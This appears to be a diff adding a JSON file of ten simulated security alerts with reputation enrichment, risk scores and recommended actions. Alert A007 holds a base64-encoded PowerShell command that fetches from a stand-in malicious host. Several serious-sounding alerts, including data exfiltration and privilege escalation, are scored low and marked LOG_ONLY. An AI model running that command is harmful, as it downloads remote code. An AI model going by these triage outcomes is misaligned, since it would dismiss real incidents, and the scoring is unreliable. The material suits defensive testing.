@@ -1,0 +1,166 @@
+[
+  {
+    "alert_id": "A001",
+    "type": "Brute Force Attack",
+    "ip": "45.83.156.122",
+    "username": "admin",
+    "timestamp": "2025-11-02T09:13:00Z",
+    "source": "Windows_Event_Log",
+    "details": "Multiple failed RDP login attempts detected on server WIN-SOC-01",
+    "enrichment": {
+      "ip": "45.83.156.122",
+      "reputation": 0,
+      "reports": 0,
+      "country": "DE",
+      "source": "AbuseIPDB"
+    },
+    "score": 20,
+    "recommended_action": "LOG_ONLY"
+  },
+  {
+    "alert_id": "A002",
+    "type": "Malware Execution",
+    "file_hash": "44d88612fea8a8f36de82e1278abb02f",
+    "hostname": "CORP-LAPTOP-09",
+    "timestamp": "2025-11-02T09:30:00Z",
+    "source": "Endpoint_AV",
+    "details": "Suspicious executable blocked by Defender, user reported lag",
+    "enrichment": {
+      "status": "no IOC found"
+    },
+    "score": 58,
+    "recommended_action": "NOTIFY_ANALYST"
+  },
+  {
+    "alert_id": "A003",
+    "type": "Phishing Email Detected",
+    "sender": "support@micros0ft-login.com",
+    "subject": "Action Required: Verify your Office 365 credentials",
+    "timestamp": "2025-11-02T09:45:00Z",
+    "source": "Email_Gateway",
+    "details": "Inbound email contained credential harvesting link",
+    "enrichment": {
+      "status": "no IOC found"
+    },
+    "score": 42,
+    "recommended_action": "NOTIFY_ANALYST"
+  },
+  {
+    "alert_id": "A004",
+    "type": "Unauthorized Access Attempt",
+    "ip": "91.215.85.17",
+    "username": "svc_backup",
+    "timestamp": "2025-11-02T10:02:00Z",
+    "source": "Linux_SSH_Log",
+    "details": "Multiple failed SSH logins detected on backup node",
+    "enrichment": {
+      "ip": "91.215.85.17",
+      "reputation": 0,
+      "reports": 0,
+      "country": "RU",
+      "source": "AbuseIPDB"
+    },
+    "score": 26,
+    "recommended_action": "LOG_ONLY"
+  },
+  {
+    "alert_id": "A005",
+    "type": "Suspicious Network Connection",
+    "ip": "185.212.44.51",
+    "port": 443,
+    "protocol": "HTTPS",
+    "timestamp": "2025-11-02T10:17:00Z",
+    "source": "Firewall_Log",
+    "details": "Outbound connection to low-reputation domain detected",
+    "enrichment": {
+      "ip": "185.212.44.51",
+      "reputation": 0,
+      "reports": 0,
+      "country": "DE",
+      "source": "AbuseIPDB"
+    },
+    "score": 29,
+    "recommended_action": "LOG_ONLY"
+  },
+  {
+    "alert_id": "A006",
+    "type": "User Privilege Escalation",
+    "username": "j.doe",
+    "hostname": "HR-TERM-05",
+    "timestamp": "2025-11-02T10:40:00Z",
+    "source": "Windows_Security_Log",
+    "details": "User obtained SeDebugPrivilege unexpectedly",
+    "enrichment": {
+      "status": "no IOC found"
+    },
+    "score": 24,
+    "recommended_action": "LOG_ONLY"
+  },
+  {
+    "alert_id": "A007",
+    "type": "Suspicious PowerShell Command",
+    "hostname": "FINANCE-SRV-02",
+    "command": "powershell -enc SQBtAHBvAHIAdABzACAALwBkAG8AdwBuAGwAbwBhAGQAIABoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC4AYwBvAG0A",
+    "timestamp": "2025-11-02T10:59:00Z",
+    "source": "Sysmon_Log",
+    "details": "Encoded PowerShell command execution detected",
+    "enrichment": {
+      "status": "no IOC found"
+    },
+    "score": 23,
+    "recommended_action": "LOG_ONLY"
+  },
+  {
+    "alert_id": "A008",
+    "type": "Malicious File Upload",
+    "file_name": "invoice_update.exe",
+    "uploader": "p.singh",
+    "hostname": "SALES-LAPTOP-11",
+    "timestamp": "2025-11-02T11:14:00Z",
+    "source": "Proxy_Log",
+    "details": "User uploaded suspicious executable to external site",
+    "enrichment": {
+      "status": "no IOC found"
+    },
+    "score": 20,
+    "recommended_action": "LOG_ONLY"
+  },
+  {
+    "alert_id": "A009",
+    "type": "Unusual Login Location",
+    "username": "r.thomas",
+    "ip": "203.0.113.98",
+    "location": "Singapore",
+    "timestamp": "2025-11-02T11:28:00Z",
+    "source": "AzureAD_SignIn_Log",
+    "details": "Login from new country detected within 10 minutes of previous session in India",
+    "enrichment": {
+      "ip": "203.0.113.98",
+      "reputation": 0,
+      "reports": 2,
+      "country": null,
+      "source": "AbuseIPDB"
+    },
+    "score": 30,
+    "recommended_action": "LOG_ONLY"
+  },
+  {
+    "alert_id": "A010",
+    "type": "Data Exfiltration Detected",
+    "ip": "198.51.100.66",
+    "hostname": "RND-SRV-05",
+    "bytes_out": 98544320,
+    "timestamp": "2025-11-02T11:49:00Z",
+    "source": "DLP_System",
+    "details": "Unusually high outbound data transfer observed to external IP",
+    "enrichment": {
+      "ip": "198.51.100.66",
+      "reputation": 0,
+      "reports": 1,
+      "country": null,
+      "source": "AbuseIPDB"
+    },
+    "score": 30,
+    "recommended_action": "LOG_ONLY"
+  }
+]
